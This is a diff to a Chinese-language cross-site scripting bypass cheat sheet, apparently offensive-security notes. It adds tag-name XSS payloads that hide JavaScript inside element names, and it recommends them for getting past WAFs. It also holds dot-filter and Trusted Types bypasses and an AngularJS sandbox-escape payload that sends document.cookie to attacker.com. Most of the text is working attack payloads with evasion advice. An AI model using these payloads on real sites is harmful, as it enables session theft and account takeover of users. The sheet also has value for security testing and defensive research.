@@ -57,6 +57,14 @@
 
 **点号过滤绕过**: ①十进制 IP——92.123.45.67→1558071511（92*256³+123*256²+45*256+67），`http://1558071511/` 无点（十六进制 0x5c7b2d43 同理）；②括号记号 `window["location"]`、`document["cookie"]`；③ `"str"["concat"](x)` 替代 +。
 
+**Tag name 载荷族（payload 藏标签名，全浏览器有效）**: 标签名内允许任意字符（字母/斜杠/空白/换行会被 uppercase，行分隔符 U+2028/段分隔符 U+2029 除外），`localName` 属性返回**小写**标签名——把 JS 藏进标签名、事件处理器里读 localName 构造执行:
+```
+<alert(1) onfocus="attributes[0].value=localName,new onfocus" autofocus tabindex=1>
+<JAVASCRIPT:ALERT(1) onfocus=location=localName autofocus tabindex=1>
+<alert<img title=" src onerror=alert(1)> " onfocus=innerHTML=localName+attributes[0].value tabindex=1 autofocus>
+```
+变体: `attributes[0].value` 被滤时用 `attributes[0].textContent`/`attributes[0].nodeValue`/`getAttributeNode('onfocus').value`；tabindex 被滤时用 `contenteditable` 顶替可聚焦；`part`/`classList` 属性把空格分隔值转数组——`event=localName;part=onfocus,onfocus=Function,eval(part[1])()`（事件变量覆盖 + Function 构造器）。WAF 通常只检属性值/常见标签名，标签名位置的 `alert(1)`/`JAVASCRIPT:` 均不命中特征——属性注入点存在但 payload 关键字被拦时的首选变形。
+
 **Chrome URL 全角归一化**: 域名校验绕过——全角拉丁 ａ-ｚ(U+FF41-FF5A) 经 Chrome IDNA/NFKC 归一化回 ASCII；拦 'x' 用 ｘ(U+FF58)、长度限制用全角字符扩展后仍归一化。U+FF0F ／→/、U+FF1A ：→:。
 
 **JSFuck**: 只许 `[]!+` 时的执行原语与解码法见 client-side-attacks.md §6。
@@ -101,7 +109,7 @@ DOMPurify 绕过三模式：
 
 **Trusted Types 绕过**：default 策略弱净化｜`createHTML:(s)=>s` 透传｜非 TT 汇（`window.name` 跨导航持久、`location.href` 导航型、`window.open(javascript:)`）｜createScript 宽松｜clobbering 覆盖策略名｜只删 `<script>` 的策略挡不住 `<img onerror>`。
 
-**AngularJS 沙箱逃逸 trim 变体**: `{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,window.location="http://attacker.com/"+document.cookie,a')}}`（Google CTF 2017，trim 返回全串破坏逐字符校验）; 1.4.x: `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}`。
+**AngularJS 沙箱逃逸 trim 变体**: `{{a=toString().constructor.prototype;a.charAt=a.trim;$eval('a,window.location="http://attacker.com/"+document.cookie,a')}}`（trim 返回全串破坏逐字符校验）; 1.4.x: `{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//')}}`。
 
 **postMessage null origin**: `if (event.origin==='http://trusted.com' || !event.origin)` 弱写法走 !event.origin 分支。null origin 产生: `data:` URI iframe 或 `<iframe sandbox="allow-scripts">`（无 allow-same-origin）。测试: data: iframe 发消息看是否进处理逻辑。修复显式拒绝: `if (!event.origin || event.origin==='null') return;`。
 
